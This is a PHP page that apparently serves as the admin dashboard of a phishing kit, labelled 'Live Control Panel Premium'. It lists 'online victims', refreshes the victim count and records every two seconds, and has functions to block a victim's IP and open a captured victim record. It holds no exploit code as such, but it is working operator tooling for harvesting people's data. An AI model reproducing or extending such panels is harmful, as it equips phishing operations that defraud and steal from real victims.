<?php 
require "classes/Jeehan.class.php";

if(!isset($_SESSION['user']) OR $_SESSION['user']==""){
	exit(header("location: login.php"));
}

if(isset($_GET['logout'])){
	unset($_SESSION['user']);
	exit(header("location: login.php"));
}
?>
<!doctype html>
<html>
<head>
<title>LCP - Admin</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, <b> <?php echo substr(PNL_USERNAME, 0, 8);?></b>
</div>
<div class="right">
<button onclick="window.location='archive.php';"><i class='fa fa-archive'></i> Archive Mode</button>
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
<button class="ban" onclick="window.location='index.php?logout';"><i class='fa fa-lock'></i> Log out</button>
</div>
</div>
<div class="content">
<div class="holder">
<div class="title">
Online Victims List <div style="display:inline-block" id="victims-counter"></div>
</div>
<div class="v-list" id="data">
Loading...
</div>
</div>
</div>


<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>


setInterval(function(){
	$.post("process/processor.php", 
	{getOnlineVics:1}, function(data){
		$("#victims-counter").html(data);
	} );
}, 2000);

setInterval(function(){
	$.post("process/processor.php", 
	{getVictims:1}, 
	function(done){	
		$("#data").html(done);
	});
}, 2000);

function ban(ip){
	var conf = confirm("You sure want to block victim (ID="+ip+")?");
	if(conf){
	$.post("process/processor.php",{ban:ip}, function(done){
		alert(done);
	} );
	}
}

function view(id){
	window.open("view.php?vid="+id);
}

</script>
</body>
</html>